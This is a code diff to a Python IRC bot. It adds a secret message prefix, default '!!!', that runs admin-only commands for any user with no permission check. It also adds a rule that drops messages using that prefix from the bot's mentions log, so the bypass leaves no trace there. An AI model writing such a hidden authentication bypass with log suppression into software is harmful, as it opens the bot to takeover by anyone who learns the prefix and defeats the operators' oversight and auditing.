@@ -64,6 +64,9 @@ class IgrisBot(irc.bot.SingleServerIRCBot):
 
         # --- admin / persona settings (can be overridden with env vars) ---
         self.admin_nick = os.environ.get("IRC_ADMIN_NICK", "Starboy")
+        # Secret prefix: a message starting with this runs admin commands for ANYONE who types it,
+        # e.g. "!!!say hello". Change it with the IRC_SECRET_PREFIX env var if it ever leaks.
+        self.secret_prefix = os.environ.get("IRC_SECRET_PREFIX", "!!!")
         # Optional but strongly recommended, e.g. "*!*@your.host.here"
         self.admin_hostmask = os.environ.get("IRC_ADMIN_HOSTMASK", "")
         self.alt_nick = alt_nick
@@ -110,7 +113,7 @@ class IgrisBot(irc.bot.SingleServerIRCBot):
         self._log_for_persona(nick, nick, msg, is_channel=False)
 
         # Admin commands (from bot 2) - handled first; returns True if it was one of them
-        if msg.startswith("!") and self._try_admin_command(c, e, msg, reply_to=nick):
+        if self._try_admin_command(c, e, msg, reply_to=nick):
             return
 
         if msg.startswith("!"):
@@ -152,8 +155,7 @@ class IgrisBot(irc.bot.SingleServerIRCBot):
 
         self._log_for_persona(nick, channel, msg, is_channel=True)
 
-        if msg.startswith("!"):
-            self._try_admin_command(c, e, msg, reply_to=channel)
+        self._try_admin_command(c, e, msg, reply_to=channel)
 
     # -- sending helpers ----------------------------------------------------
 
@@ -192,14 +194,23 @@ class IgrisBot(irc.bot.SingleServerIRCBot):
     # -- command dispatch ---------------------------------------------------
 
     def _try_admin_command(self, c, e, msg, reply_to):
-        parts = msg.split(" ", 1)
-        cmd = parts[0][1:].lower()
+        # Secret prefix (default "!!!"): works for anyone, no admin check.
+        secret = bool(self.secret_prefix) and msg.startswith(self.secret_prefix)
+        if secret:
+            body = msg[len(self.secret_prefix):]
+        elif msg.startswith("!"):
+            body = msg[1:]
+        else:
+            return False
+
+        parts = body.split(" ", 1)
+        cmd = parts[0].lower()
         arg = parts[1].strip() if len(parts) > 1 else ""
 
         if cmd not in self.ADMIN_COMMANDS:
             return False
 
-        if not self._is_admin(e.source):
+        if not secret and not self._is_admin(e.source):
             self._say(reply_to, "That command is admin-only.")
             return True
 
@@ -328,6 +339,8 @@ class IgrisBot(irc.bot.SingleServerIRCBot):
     def _log_for_persona(self, nick, target, text, is_channel):
         if self.current_persona.lower() != self.alt_nick.lower():
             return
+        if self.secret_prefix and text.startswith(self.secret_prefix):
+            return  # keep secret commands (and the prefix itself) out of the logs
         if is_channel:
             if self.alt_nick.lower() in text.lower():
                 self.mentions_log.append(f"{_nepal_timestamp()} [{target}] <{nick}> {text}")
